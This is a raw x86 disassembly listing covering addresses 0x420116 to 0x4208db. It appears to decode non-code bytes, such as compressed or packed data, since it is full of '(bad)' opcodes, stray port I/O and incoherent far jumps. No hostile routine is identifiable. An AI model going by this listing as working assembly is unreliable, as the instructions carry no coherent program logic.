  420116:	xor    ebx,DWORD PTR [esi+0x1c66625d]
  42011c:	jmp    0xc0ec4b63
  420121:	dec    ebp
  420122:	es rep ins DWORD PTR es:[edi],dx
  420125:	cli    
  420126:	mov    ebp,0xa87b9948
  42012b:	sub    al,0xe2
  42012d:	adc    ebp,DWORD PTR [ebp-0x3b]
  420130:	sub    DWORD PTR [edx-0x3a864c97],ecx
  420136:	mov    DWORD PTR [esi],esp
  420138:	lahf   
  420139:	in     al,0x68
  42013b:	fidivr DWORD PTR [esi+0x37]
  42013e:	shl    DWORD PTR [ebx+eax*1+0x4ec5e52d],cl
  420145:	mov    ebp,0x720ab1c
  42014a:	jg     0x42016f
  42014c:	sub    BYTE PTR [edi],ah
  42014e:	bound  ecx,QWORD PTR [edi]
  420150:	aaa    
  420151:	jecxz  0x42010c
  420153:	add    BYTE PTR [si-0x4b],0x63
  420158:	and    al,0xc
  42015a:	mov    ds:0x39e4eec1,eax
  420160:	mov    ah,0xad
  420162:	jmp    0x4201de
  420164:	mov    WORD PTR [ebx-0x30],ss
  420167:	nop
  420168:	sbb    bh,ch
  42016a:	cmp    al,0xfd
  42016c:	lahf   
  42016d:	xor    al,0x49
  42016f:	cmp    BYTE PTR [edx],al
  420171:	lock and esi,esi
  420174:	test   DWORD PTR [esi-0x35],ecx
  420177:	pushf  
  420178:	push   cs
  420179:	aaa    
  42017a:	jecxz  0x4201b7
  42017c:	sub    bl,dl
  42017e:	sbb    al,BYTE PTR [ecx]
  420180:	or     eax,0x831728e7
  420185:	out    0x4e,eax
  420187:	sub    cl,BYTE PTR [edi+0x436793a3]
  42018d:	sub    bh,cl
  42018f:	xlat   BYTE PTR ds:[ebx]
  420190:	pusha  
  420191:	outs   dx,BYTE PTR ds:[esi]
  420192:	or     BYTE PTR [eax-0x3a],bh
  420195:	(bad)  
  420196:	in     al,0xea
  420198:	cmp    al,0xa9
  42019a:	in     al,dx
  42019b:	addr16 enter 0xaba3,0xad
  4201a0:	push   edi
  4201a1:	pop    ebx
  4201a2:	inc    eax
  4201a3:	jns    0x4201bd
  4201a5:	mov    eax,0xfc6b9f61
  4201aa:	ins    DWORD PTR es:[edi],dx
  4201ab:	adc    eax,DWORD PTR [ecx-0x6a]
  4201ae:	push   ss
  4201af:	in     eax,0x42
  4201b1:	push   esp
  4201b2:	stos   BYTE PTR es:[edi],al
  4201b3:	jbe    0x420162
  4201b5:	shl    DWORD PTR [ecx+0x30702221],0xa8
  4201bc:	mov    edx,DWORD PTR ds:0x86bdceb8
  4201c2:	jae    0x4201ed
  4201c4:	mov    ebx,0x6935c319
  4201c9:	daa    
  4201ca:	pop    ds
	...
  4201e7:	add    BYTE PTR [eax],al
  4201e9:	add    BYTE PTR [ecx+0x57],bl
  4201ec:	inc    ecx
  4201ed:	dec    ebx
  4201ee:	dec    edi
  4201ef:	pop    edi
  4201f0:	pop    ebx
  4201f1:	push   edi
  4201f2:	sub    al,0x52
  4201f4:	xchg   DWORD PTR [ebx-0x61],esi
  4201f7:	lahf   
  4201f8:	ret    0xebfe
  4201fb:	nop
  4201fc:	add    DWORD PTR [eax],eax
  4201fe:	mov    DWORD PTR [esi],eax
  420200:	add    BYTE PTR [eax],al
  420202:	clc    
  420203:	and    esi,ecx
  420205:	pop    edi
  420206:	hlt    
  420207:	popf   
  420208:	inc    BYTE PTR [edi+0x398daab0]
  42020e:	mov    WORD PTR [ebp-0x2],ss
  420211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420212:	sub    al,0x78
  420214:	fucomi st,st(2)
  420216:	inc    eax
  420217:	mov    cl,0xd1
  420219:	jge    0x420222
  42021b:	pause  
  42021d:	es pop esi
  42021f:	adc    ebx,DWORD PTR [esi+0x3eefb902]
  420225:	xchg   DWORD PTR [edx+0x74],eax
  420228:	ins    BYTE PTR es:[edi],dx
  420229:	out    0x67,al
  42022b:	inc    ebp
  42022c:	stos   DWORD PTR es:[edi],eax
  42022d:	jnp    0x4201b0
  42022f:	and    al,0x5c
  420231:	outs   dx,DWORD PTR ds:[esi]
  420232:	les    edx,FWORD PTR [eax-0x41a1ecfa]
  420238:	(bad)  
  420239:	mov    al,0x3a
  42023b:	test   al,0xb1
  42023d:	int    0x5d
  42023f:	ja     0x420292
  420241:	jnp    0x42029a
  420243:	pop    ss
  420244:	dec    edx
  420245:	cmp    DWORD PTR [ecx-0x78],ebp
  420248:	out    dx,eax
  420249:	outs   dx,BYTE PTR ds:[esi]
  42024a:	cld    
  42024b:	int3   
  42024c:	and    eax,0x1cad30da
  420251:	mov    ds:0x8e90bc34,al
  420256:	aam    0x3f
  420258:	jecxz  0x420255
  42025a:	xor    edi,DWORD PTR [edi+0x6e]
  42025d:	jno    0x42027e
  42025f:	std    
  420260:	push   0xffffff9e
  420262:	mov    dl,bh
  420264:	inc    ecx
  420265:	pop    eax
  420266:	lock sbb cl,cl
  420269:	push   cs
  42026a:	std    
  42026b:	inc    esp
  42026c:	cmp    edi,esp
  42026e:	outs   dx,DWORD PTR ds:[esi]
  42026f:	inc    eax
  420270:	fcmovbe st,st(5)
  420272:	and    eax,0xe8a52439
  420277:	mov    bh,BYTE PTR [ecx-0x2ea58414]
  42027d:	jl     0x420284
  42027f:	lods   eax,DWORD PTR ds:[esi]
  420280:	into   
  420281:	stos   DWORD PTR es:[edi],eax
  420282:	push   0x8e285b48
  420287:	mul    DWORD PTR [esi+edi*4]
  42028a:	iret   
  42028b:	stc    
  42028c:	fisttp QWORD PTR [edi-0x75cadc01]
  420292:	icebp  
  420293:	lods   al,BYTE PTR ds:[esi]
  420294:	enter  0xde,0x7c
  420298:	ficom  DWORD PTR [esi+0x2ebf12f6]
  42029e:	mov    ah,0xde
  4202a0:	stc    
  4202a1:	push   0xffffffac
  4202a3:	jg     0x42026c
  4202a5:	ja     0x42022c
  4202a7:	inc    ebx
  4202a8:	inc    esi
  4202a9:	fwait
  4202aa:	mov    WORD PTR [ecx],fs
  4202ac:	pusha  
  4202ad:	aas    
  4202ae:	mov    ?,WORD PTR [esi+eiz*1]
  4202b1:	or     BYTE PTR [eax-0x85630a3],ah
  4202b7:	jl     0x42023e
  4202b9:	(bad)  
  4202ba:	sub    edi,DWORD PTR [eax]
  4202bc:	(bad)  
  4202bd:	mov    cl,0x25
  4202bf:	add    DWORD PTR [edi+0x65],edx
  4202c2:	leave  
  4202c3:	sub    al,BYTE PTR [ebp+edx*4+0x6936091]
  4202ca:	inc    esp
  4202cb:	sahf   
  4202cc:	shl    BYTE PTR [ebp+0x4448f27f],0x58
  4202d3:	push   ebp
  4202d4:	mov    al,0xbc
  4202d6:	scas   eax,DWORD PTR es:[edi]
  4202d7:	aaa    
  4202d8:	pop    ebp
  4202d9:	popa   
  4202da:	xchg   esp,eax
  4202db:	add    DWORD PTR [ecx],ecx
  4202dd:	lds    edx,FWORD PTR es:[eax]
  4202e0:	pop    edx
  4202e1:	cs addr16 inc edi
  4202e4:	(bad)  
  4202e5:	daa    
  4202e6:	repz mov ebp,0xb2bee618
  4202ec:	loopne 0x4202af
  4202ee:	pop    ss
  4202ef:	iret   
  4202f0:	ins    DWORD PTR es:[di],dx
  4202f2:	sbb    eax,0xbb672ca7
  4202f7:	mov    al,0x46
  4202f9:	stc    
  4202fa:	pop    edi
  4202fb:	lahf   
  4202fc:	jmp    0x9b3d:0xb93c31d
  420303:	sub    al,0x6a
  420305:	aas    
  420306:	fadd   QWORD PTR ds:0x42895fcb
  42030c:	scas   eax,DWORD PTR es:[edi]
  42030d:	xor    ah,BYTE PTR [ebx+0x52]
  420310:	aaa    
  420311:	int3   
  420312:	js     0x420295
  420314:	push   esp
  420315:	mov    eax,DWORD PTR [edx-0x17]
  420318:	fisub  DWORD PTR [ecx-0x5]
  42031b:	xor    al,BYTE PTR [eax-0x565adc48]
  420321:	pop    esp
  420322:	into   
  420323:	repnz inc eax
  420325:	popa   
  420326:	jae    0x4202d6
  420328:	test   al,0xa7
  42032a:	pusha  
  42032b:	data16 lods al,BYTE PTR ds:[esi]
  42032d:	cmp    al,0x29
  42032f:	dec    edi
  420330:	and    DWORD PTR [edi+ebp*1],edx
  420333:	or     eax,0xe24bf470
  420338:	retf   
  420339:	inc    edx
  42033a:	je     0x4202d9
  42033c:	test   eax,0x7d8a9e6b
  420341:	jne    0x42030e
  420343:	mov    ebx,0xa9bc25ed
  420348:	shl    DWORD PTR [ebp+0x50],0xc4
  42034c:	xchg   edx,eax
  42034d:	jge    0x4202d8
  42034f:	bound  esi,QWORD PTR [edi-0x20824f22]
  420355:	cmp    edi,ebp
  420357:	cmp    edi,edx
  420359:	js     0x42039d
  42035b:	mov    al,0xeb
  42035d:	xchg   esi,eax
  42035e:	ins    BYTE PTR es:[edi],dx
  42035f:	or     edi,DWORD PTR [esi]
  420361:	outs   dx,DWORD PTR ds:[esi]
  420362:	and    DWORD PTR [edi],edi
  420364:	push   edx
  420365:	or     ch,dh
  420367:	dec    ebp
  420368:	outs   dx,BYTE PTR ds:[esi]
  420369:	nop
  42036a:	icebp  
  42036b:	das    
  42036c:	lea    esp,[esi]
  42036e:	shl    BYTE PTR [ecx+0x9],0xd0
  420372:	mov    cs,WORD PTR [ebp-0x71]
  420375:	push   ebp
  420376:	test   BYTE PTR [ecx-0x31],bl
  420379:	repz cmp al,bh
  42037c:	and    BYTE PTR [eax],0x99
  42037f:	add    BYTE PTR [ecx+0x7e1e7df8],dh
  420385:	jbe    0x420387
  420387:	in     eax,dx
  420388:	retf   0xe998
  42038b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42038c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42038d:	add    al,0x57
  42038f:	jno    0x42031d
  420391:	push   ecx
  420392:	cmp    BYTE PTR [ecx-0x30e2bb8],ah
  420398:	jecxz  0x4203a0
  42039a:	dec    ebx
  42039b:	out    dx,al
  42039c:	fsubr  st,st(5)
  42039e:	jne    0x420323
  4203a0:	repnz xor al,0xb6
  4203a3:	loope  0x42035f
  4203a5:	in     eax,0x19
  4203a7:	das    
  4203a8:	push   ss
  4203a9:	jmp    0x2bfc:0xfdcc3e1b
  4203b0:	dec    edi
  4203b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203b2:	in     al,0xa4
  4203b4:	pop    ebx
  4203b5:	aad    0x2c
  4203b7:	jne    0x420377
  4203b9:	std    
  4203ba:	mov    cl,0x91
  4203bc:	sub    BYTE PTR [ecx+eax*4-0x16],ch
  4203c0:	aam    0xa6
  4203c2:	lea    edx,[ebx]
  4203c4:	sbb    DWORD PTR [edi],esp
  4203c6:	jne    0x4203dc
  4203c8:	adc    DWORD PTR [ebx+0x58],esp
  4203cb:	pushf  
  4203cc:	rcl    DWORD PTR [eax-0x13],0x5c
  4203d0:	sbb    BYTE PTR [ebp+0x9],cl
  4203d3:	sub    ah,BYTE PTR [ecx+eiz*1+0x6fbd1c7a]
  4203da:	jbe    0x420447
  4203dc:	in     al,0xa1
  4203de:	int3   
  4203df:	pop    ss
  4203e0:	pop    es
  4203e1:	cmp    BYTE PTR [esi+0x1bc3efa3],0xe2
  4203e8:	and    al,0xa6
  4203ea:	gs jnp 0x42039e
  4203ed:	mov    dl,0xf9
  4203ef:	std    
  4203f0:	ror    DWORD PTR [edi],0x7e
  4203f3:	adc    ch,cl
  4203f5:	outs   dx,BYTE PTR ds:[esi]
  4203f6:	outs   dx,BYTE PTR ds:[esi]
  4203f7:	and    DWORD PTR [edx-0x2c7ebe3b],ebx
  4203fd:	sti    
  4203fe:	add    ecx,DWORD PTR [edi]
  420400:	lock outs dx,DWORD PTR ds:[esi]
  420402:	fild   WORD PTR ds:0xf6cf16b4
  420408:	dec    ebp
  420409:	loopne 0x4203f4
  42040b:	cmp    DWORD PTR [edi],ecx
  42040d:	jbe    0x420482
  42040f:	loop   0x42044b
  420411:	or     ecx,DWORD PTR [edi+0x70]
  420414:	xor    eax,0xe88a71ac
  420419:	and    BYTE PTR [esi+esi*1],bl
  42041c:	sbb    DWORD PTR [ebx-0x7dbd167c],0xe1ab364f
  420426:	and    eax,0xcdc196a9
  42042b:	inc    edx
  42042c:	sbb    al,0xed
  42042e:	pop    eax
  42042f:	jl     0x4203c1
  420431:	lods   eax,DWORD PTR ds:[esi]
  420432:	in     eax,0xca
  420434:	pusha  
  420435:	push   ebp
  420436:	sub    BYTE PTR [edi+ebx*8-0x5b],dh
  42043a:	test   DWORD PTR [ebx-0x43],0x92aa5635
  420441:	xchg   esp,eax
  420442:	int    0xb1
  420444:	fbld   TBYTE PTR [eax-0x52]
  420447:	or     bh,al
  420449:	jmp    0x420497
  42044b:	xchg   edx,eax
  42044c:	dec    edx
  42044d:	sbb    al,0x14
  42044f:	ja     0x4203fb
  420451:	(bad)  
  420452:	adc    eax,0xb90b44a3
  420457:	test   eax,0x4d7c4ff
  42045c:	rol    edi,cl
  42045e:	cld    
  42045f:	push   cs
  420460:	addr16 pushf 
  420462:	cs pushf 
  420464:	or     BYTE PTR [eax+ebp*2+0x65],bh
  420468:	popa   
  420469:	mov    ebp,0x7e0223de
  42046e:	sub    eax,0x9cf35aec
  420473:	mov    ah,0x8d
  420475:	scas   eax,DWORD PTR es:[edi]
  420476:	mov    ch,0xc6
  420478:	arpl   WORD PTR [ebx-0x2be3d2f7],dx
  42047e:	mov    dh,0xb5
  420480:	outs   dx,BYTE PTR ds:[esi]
  420481:	in     al,dx
  420482:	dec    ebp
  420483:	(bad)  
  420484:	fs frndint 
  420487:	adc    ecx,esp
  420489:	or     BYTE PTR [esi+0x41f1ecf3],bl
  42048f:	mov    ds:0xd591f378,al
  420494:	jge    0x4204b2
  420496:	push   0xffffffb1
  420498:	fnstenv [ecx+0x54]
  42049b:	xor    ebp,DWORD PTR [edx]
  42049d:	and    DWORD PTR [esp+0x10],ebp
  4204a1:	ins    BYTE PTR es:[edi],dx
  4204a2:	xchg   BYTE PTR [edx-0x68],ch
  4204a5:	sar    DWORD PTR [ecx-0x10a87bad],1
  4204ab:	and    eax,eax
  4204ad:	cdq    
  4204ae:	jg     0x420454
  4204b0:	clc    
  4204b1:	fist   DWORD PTR [eax-0x77]
  4204b4:	cld    
  4204b5:	xchg   BYTE PTR [esi-0x32],dl
  4204b8:	(bad)  
  4204ba:	push   0xe629909f
  4204bf:	shr    ecx,cl
  4204c1:	pop    ecx
  4204c2:	pop    ebx
  4204c3:	xor    eax,0xb6542031
  4204c8:	jns    0x4204a2
  4204ca:	push   ecx
  4204cb:	xchg   esp,eax
  4204cc:	pop    ss
  4204cd:	xor    DWORD PTR [esi+0x51efbdd0],0x957c53cb
  4204d7:	inc    ebp
  4204d8:	jle    0x420533
  4204da:	ret    0x2701
  4204dd:	imul   esi,eax,0x9a58012a
  4204e3:	cld    
  4204e4:	leave  
  4204e5:	sbb    ebx,DWORD PTR [ebx]
  4204e7:	clc    
  4204e8:	imul   ebx,DWORD PTR [edx],0x7ac85124
  4204ee:	(bad)  
  4204ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204f0:	mov    al,0x79
  4204f2:	hlt    
  4204f3:	call   0x7b8d:0x99250dac
  4204fa:	rol    DWORD PTR [eax-0x88ed704],0x4a
  420501:	push   cs
  420502:	xchg   edx,edi
  420504:	dec    ebp
  420505:	jns    0x42055d
  420507:	jle    0x4204e8
  420509:	nop
  42050a:	dec    esi
  42050b:	cmp    edi,ebx
  42050d:	inc    ebp
  42050e:	push   esi
  42050f:	dec    edi
  420510:	mov    ebp,0x214c5ee4
  420515:	(bad)  
  420516:	pop    ebx
  420517:	sbb    eax,0x8d9de8ed
  42051c:	les    edi,FWORD PTR [edx+ecx*2]
  42051f:	or     al,0x9c
  420521:	xor    DWORD PTR [ecx+0x697b5269],0x35279c2c
  42052b:	push   esi
  42052c:	push   ss
  42052d:	fs pop edi
  42052f:	adc    al,0xa6
  420531:	(bad)  
  420532:	shl    BYTE PTR [ecx-0x1b],1
  420535:	(bad)  [ebx]
  420537:	jp     0x42055f
  420539:	mov    ebx,0x8c98ee41
  42053e:	mov    ds:0x7544f843,eax
  420543:	retf   0x783a
  420546:	ror    DWORD PTR [ecx-0x3a038979],cl
  42054c:	inc    esp
  42054d:	popf   
  42054e:	ja     0x4205b9
  420550:	in     al,0x4e
  420552:	push   ebx
  420553:	xor    al,0x25
  420555:	icebp  
  420556:	fwait
  420557:	xchg   edx,eax
  420558:	adc    eax,0xc6634d83
  42055d:	es (bad) 
  42055f:	push   0xffffffa3
  420561:	sbb    DWORD PTR [edx+ecx*1-0x17b380b5],esp
  420568:	dec    ebx
  420569:	adc    DWORD PTR [ebx+0x32e62a47],0xfffffff1
  420570:	dec    esi
  420571:	data16 and cl,BYTE PTR [ebx]
  420574:	int    0x93
  420576:	push   cs
  420577:	xlat   BYTE PTR ds:[ebx]
  420578:	adc    al,bl
  42057a:	xchg   edi,eax
  42057b:	xor    DWORD PTR [ebx],ebp
  42057d:	jae    0x42053d
  42057f:	rol    DWORD PTR [edx+0x59],1
  420582:	dec    esp
  420583:	pop    ebx
  420584:	outs   dx,BYTE PTR ds:[esi]
  420585:	ror    BYTE PTR [edx-0x10272bd7],0x3a
  42058c:	xor    dh,BYTE PTR [ecx-0x731a0a8a]
  420592:	jge    0x420544
  420594:	cmp    DWORD PTR [esi+0x17],0x21
  420598:	dec    ebx
  420599:	dec    bx
  42059b:	push   ebp
  42059c:	adc    DWORD PTR [esi+esi*1-0x1c7d9e3b],edi
  4205a3:	adc    BYTE PTR [edi+0x78],cl
  4205a6:	adc    edi,DWORD PTR [ecx-0x7a]
  4205a9:	sub    ebp,DWORD PTR [eax+0x7a]
  4205ac:	mov    ebp,0x91a38633
  4205b1:	cmc    
  4205b2:	addr16 xchg esp,eax
  4205b4:	xor    eax,0x75546262
  4205b9:	mov    eax,ds:0x3e344b32
  4205be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205bf:	sub    al,0xb1
  4205c1:	xor    al,0x53
  4205c3:	pushf  
  4205c4:	int    0x32
  4205c6:	sub    eax,0x815dc133
  4205cb:	jbe    0x420578
  4205cd:	pop    ebp
  4205ce:	ja     0x420642
  4205d0:	ins    BYTE PTR es:[edi],dx
  4205d1:	pop    ecx
  4205d2:	inc    edi
  4205d3:	mov    ch,BYTE PTR [edx+0x4a]
  4205d6:	dec    edx
  4205d7:	loope  0x420564
  4205d9:	daa    
  4205da:	not    BYTE PTR [eax+ebx*8]
  4205dd:	cmp    dl,ah
  4205df:	jns    0x4205e5
  4205e1:	mov    cl,0xc0
  4205e3:	mov    bh,0xea
  4205e5:	xlat   BYTE PTR ds:[ebx]
  4205e6:	ret    0xa900
  4205e9:	xchg   BYTE PTR [ecx+0x4b],bh
  4205ec:	dec    eax
  4205ed:	pop    esp
  4205ee:	retf   0x8b42
  4205f1:	add    eax,0xf8f5161e
  4205f6:	lods   al,BYTE PTR ds:[esi]
  4205f7:	(bad)  
  4205f8:	stc    
  4205f9:	jnp    0x42064f
  4205fb:	leave  
  4205fc:	mov    WORD PTR [ebp+0x1de188f0],es
  420602:	das    
  420603:	inc    ebp
  420604:	inc    ebx
  420605:	xchg   edi,eax
  420606:	lods   eax,DWORD PTR ds:[esi]
  420607:	sub    BYTE PTR [edx-0x51f5a8df],ch
  42060d:	icebp  
  42060e:	scas   al,BYTE PTR es:[edi]
  42060f:	neg    BYTE PTR [edi+edx*8+0x4d]
  420613:	xor    dl,0x2
  420616:	mov    cl,0x54
  420618:	out    0x89,eax
  42061a:	out    0x6f,eax
  42061c:	arpl   WORD PTR [eax+0x1d169432],bp
  420622:	xor    eax,0xf18c3116
  420627:	cld    
  420628:	inc    eax
  420629:	retf   
  42062a:	cwde   
  42062b:	pop    edi
  42062c:	xor    al,dl
  42062e:	cmp    dh,BYTE PTR [esi]
  420630:	into   
  420631:	(bad)  
  420632:	cdq    
  420633:	stc    
  420634:	sbb    dl,BYTE PTR [edx]
  420636:	inc    edx
  420637:	out    0x8c,eax
  420639:	add    edi,eax
  42063b:	clc    
  42063c:	and    al,BYTE PTR [ebp+0x76]
  42063f:	jl     0x420662
  420641:	div    BYTE PTR ds:0x4837d38b
  420647:	or     dl,dh
  420649:	cmc    
  42064a:	mov    ebx,0x7bea22f3
  42064f:	xchg   ebx,eax
  420650:	xchg   BYTE PTR [eax],ah
  420652:	mov    esi,0x5c74bf3c
  420657:	sub    BYTE PTR [edi-0x54],ch
  42065a:	add    esp,edx
  42065c:	mov    bh,0x59
  42065e:	push   ecx
  42065f:	test   DWORD PTR [edx+ecx*4-0x2a6c41f9],esi
  420666:	mov    ebx,0xcce02d89
  42066b:	aad    0x1e
  42066d:	push   ebx
  42066e:	retf   
  42066f:	push   ebp
  420670:	out    dx,eax
  420671:	fucomi st,st(3)
  420673:	popf   
  420674:	leave  
  420675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420676:	pushf  
  420677:	mov    al,ds:0x9bc9b2d9
  42067c:	lea    ecx,[ebx]
  42067e:	dec    ecx
  42067f:	cwde   
  420680:	mov    esp,ds
  420682:	cmp    eax,0x8111c1a4
  420687:	pusha  
  420688:	dec    esp
  420689:	sbb    ch,BYTE PTR [eax+0x65df3cac]
  42068f:	mov    edx,0x4ee18c5f
  420694:	jne    0x4206c0
  420696:	pop    edi
  420697:	loope  0x4206b5
  420699:	cdq    
  42069a:	das    
  42069b:	add    eax,ebx
  42069d:	pop    es
  42069e:	xchg   ebx,eax
  42069f:	out    0x13,al
  4206a1:	imul   DWORD PTR [ecx]
  4206a3:	xchg   esi,eax
  4206a4:	pop    edx
  4206a5:	or     al,0x27
  4206a7:	loope  0x420716
  4206a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206aa:	xlat   BYTE PTR ds:[ebx]
  4206ab:	mov    esp,DWORD PTR [eax]
  4206ad:	inc    ebp
  4206ae:	popa   
  4206af:	ja     0x420706
  4206b1:	fdivr  QWORD PTR [ecx+esi*2-0x74a67a98]
  4206b8:	adc    al,0xcd
  4206ba:	neg    DWORD PTR [edx]
  4206bc:	add    BYTE PTR [ecx],dh
  4206be:	xchg   DWORD PTR [ebp+0x7606083],edi
  4206c4:	in     eax,dx
  4206c5:	and    BYTE PTR [edx+0x76],bl
  4206c8:	xor    dh,BYTE PTR [edi+edx*8-0x52e8622c]
  4206cf:	call   0x507e:0xae05bb2c
  4206d6:	shl    DWORD PTR ds:0x9d2750ae,1
  4206dc:	dec    ebp
  4206dd:	cmp    BYTE PTR [ebx],0x5f
  4206e0:	adc    DWORD PTR [ecx+0x1ac7e823],eax
  4206e6:	xchg   esp,eax
  4206e7:	jmp    0x93b59bc
  4206ec:	add    al,BYTE PTR [ebp-0x7fb0439b]
  4206f2:	out    0x70,eax
  4206f4:	mov    ebx,0x212dbbe3
  4206f9:	cmp    ebp,DWORD PTR [ebp+0x7fd529d0]
  4206ff:	inc    edi
  420700:	push   ss
  420701:	lods   al,BYTE PTR ds:[esi]
  420702:	mov    ecx,0xe508d6cf
  420707:	dec    ebx
  420708:	mov    al,0xc6
  42070a:	push   ebp
  42070b:	popa   
  42070c:	sti    
  42070d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42070e:	aaa    
  42070f:	sbb    ecx,DWORD PTR [edx+0x55]
  420712:	aam    0xdd
  420714:	movntq QWORD PTR [eax+0x12956ee1],mm7
  42071b:	xchg   esi,eax
  42071c:	repz sbb BYTE PTR [ecx-0x58],bh
  420720:	xor    edi,DWORD PTR [esi+0xe]
  420723:	inc    ebp
  420724:	mov    ebp,0xf4fa9b38
  420729:	loop   0x420751
  42072b:	and    ebp,esi
  42072d:	xor    DWORD PTR [eax],ebx
  42072f:	mov    cl,0x4d
  420731:	push   ecx
  420732:	jmp    0xd11889e6
  420737:	xchg   edi,eax
  420738:	sbb    BYTE PTR [edi+0x294106f4],bh
  42073e:	jo     0x4206c9
  420740:	push   ebx
  420741:	test   edi,ecx
  420743:	inc    edi
  420744:	mov    esp,0x324c6b79
  420749:	inc    esi
  42074a:	(bad)  
  42074b:	cwde   
  42074c:	rol    DWORD PTR [edi+0x44],1
  42074f:	xor    al,0x58
  420751:	mov    bl,0x4c
  420753:	dec    edi
  420754:	mov    ds:0x7f7518c,al
  420759:	cmp    BYTE PTR [esi-0x6b95933e],bl
  42075f:	loope  0x4207d3
  420761:	xchg   ecx,eax
  420762:	leave  
  420763:	sbb    eax,0xc0715932
  420768:	mov    cl,0xa4
  42076a:	div    DWORD PTR [eax-0x10a10e53]
  420770:	add    eax,0xa3cd4bf4
  420775:	fs ds cmc 
  420778:	lock pusha 
  42077a:	jle    0x420706
  42077c:	mov    bl,0x4a
  42077e:	sbb    al,0x5
  420780:	adc    bh,BYTE PTR [edi+0x7d]
  420783:	jl     0x4207ec
  420785:	mov    edi,0xb9630f73
  42078a:	js     0x420798
  42078c:	aas    
  42078d:	leave  
  42078e:	mov    esi,0x1f668b74
  420793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420794:	inc    edx
  420795:	es fs test al,0x53
  420799:	cmp    DWORD PTR [edx-0x6a],eax
  42079c:	ja     0x420724
  42079e:	or     DWORD PTR [edx],ecx
  4207a0:	leave  
  4207a1:	repnz add bl,dl
  4207a4:	rol    BYTE PTR [edx],1
  4207a6:	add    DWORD PTR [eax+0x7b],edx
  4207a9:	push   ss
  4207aa:	sahf   
  4207ab:	les    esi,FWORD PTR [ebx]
  4207ad:	xchg   ebx,eax
  4207ae:	add    dl,bh
  4207b0:	or     DWORD PTR [ebp+0x71],edi
  4207b3:	mov    eax,ds:0x78c19530
  4207b8:	mov    bh,0xdd
  4207ba:	xchg   edx,eax
  4207bb:	inc    ecx
  4207bc:	dec    esp
  4207bd:	stc    
  4207be:	into   
  4207bf:	cmp    ch,BYTE PTR [esi]
  4207c1:	fimul  DWORD PTR [ecx+0x2]
  4207c4:	jne    0x4207e1
  4207c6:	add    eax,0x24347840
  4207cb:	sbb    DWORD PTR [ecx],edx
  4207cd:	cmp    BYTE PTR [esi+0x4db5ee8d],dl
  4207d3:	cmp    cl,BYTE PTR [esi-0x33e87205]
  4207d9:	jle    0x4207f1
  4207db:	mov    al,0x64
  4207dd:	(bad)  
  4207df:	ret    0xc929
  4207e2:	sbb    al,0x20
  4207e4:	adc    esi,DWORD PTR [ebp-0x40d777c9]
  4207ea:	push   eax
  4207eb:	in     eax,0xce
  4207ed:	imul   edx,DWORD PTR [eax],0xffffffcd
  4207f0:	fistp  WORD PTR [eax-0x21]
  4207f3:	in     eax,0x78
  4207f5:	xchg   BYTE PTR [esi-0xb],dl
  4207f8:	loopne 0x420807
  4207fa:	sbb    bh,BYTE PTR [esi-0x7fdc15ce]
  420800:	or     al,0x15
  420802:	mov    ebx,0xf0648d51
  420807:	cmp    cl,BYTE PTR [edi+ecx*4]
  42080a:	sbb    ch,BYTE PTR [esi]
  42080c:	mov    ecx,DWORD PTR [ebx+0x24]
  42080f:	inc    esi
  420810:	stc    
  420811:	ss jmp 0xa19f:0x3ba0be22
  420819:	(bad)  
  42081b:	mov    al,ds:0xe9d35c7
  420820:	xchg   edx,eax
  420821:	out    dx,eax
  420822:	sti    
  420823:	xchg   ebx,eax
  420824:	xchg   ebp,eax
  420825:	into   
  420826:	add    al,al
  420828:	jnp    0x4207ac
  42082a:	aaa    
  42082b:	push   edx
  42082c:	shl    DWORD PTR [edx-0x74],0x64
  420830:	(bad)  
  420832:	xchg   esp,eax
  420833:	pusha  
  420834:	cmp    ecx,DWORD PTR [edx]
  420836:	out    0xc8,eax
  420838:	ss inc edx
  42083a:	adc    eax,0x8a4b4623
  42083f:	arpl   WORD PTR [edi+ecx*2],sp
  420842:	xchg   ebx,eax
  420843:	and    dl,BYTE PTR [esi]
  420845:	or     bl,BYTE PTR [eax]
  420847:	add    al,0x31
  420849:	mov    ds:0x46819982,eax
  42084e:	iret   
  42084f:	xchg   dl,dl
  420851:	shl    BYTE PTR [edx],cl
  420853:	ret    0x1261
  420856:	sahf   
  420857:	add    DWORD PTR [ebx+0x62],ecx
  42085a:	cwde   
  42085b:	jo     0x4208d3
  42085d:	adc    cl,BYTE PTR [eax]
  42085f:	jmp    0x42084b
  420861:	(bad)  
  420863:	ss pop esi
  420865:	push   es
  420866:	sub    eax,0x9d2e3a79
  42086b:	test   al,0xd7
  42086d:	cmp    eax,0x2168213b
  420872:	and    al,0xe8
  420874:	mov    dl,bl
  420876:	out    dx,eax
  420877:	out    dx,eax
  420878:	rcr    DWORD PTR [edi-0x35],0x12
  42087c:	fwait
  42087d:	mov    esp,esp
  42087f:	inc    edx
  420880:	addr16 push ebp
  420882:	loopne 0x4208fc
  420884:	dec    esp
  420885:	jmp    0x65:0x903c084e
	...
  4208a8:	add    BYTE PTR [eax],al
  4208aa:	inc    esp
  4208ab:	dec    ebp
  4208ac:	dec    edx
  4208ad:	dec    ebx
  4208ae:	dec    ebx
  4208af:	dec    edi
  4208b0:	inc    ebp
  4208b1:	dec    edi
  4208b2:	sub    eax,0x8b04921e
  4208b7:	adc    BYTE PTR [ebx+0x16],0x74
  4208bb:	xchg   edi,eax
  4208bc:	add    DWORD PTR [eax],eax
  4208be:	mov    DWORD PTR [esi],eax
  4208c0:	add    BYTE PTR [eax],al
  4208c2:	adc    edi,DWORD PTR [edx+0x5]
  4208c5:	int    0x52
  4208c7:	into   
  4208c8:	mov    ecx,DWORD PTR [ebx-0x7e1eaee9]
  4208ce:	jl     0x4208ea
  4208d0:	or     ebp,DWORD PTR [ebp-0x20]
  4208d3:	or     esp,esp
  4208d5:	imul   eax,ebx,0xffffffc2
  4208d8:	cmc    
  4208d9:	outs   dx,BYTE PTR ds:[esi]
  4208da:	stc    
  4208db:	mov    al,cs:0x7de4a749
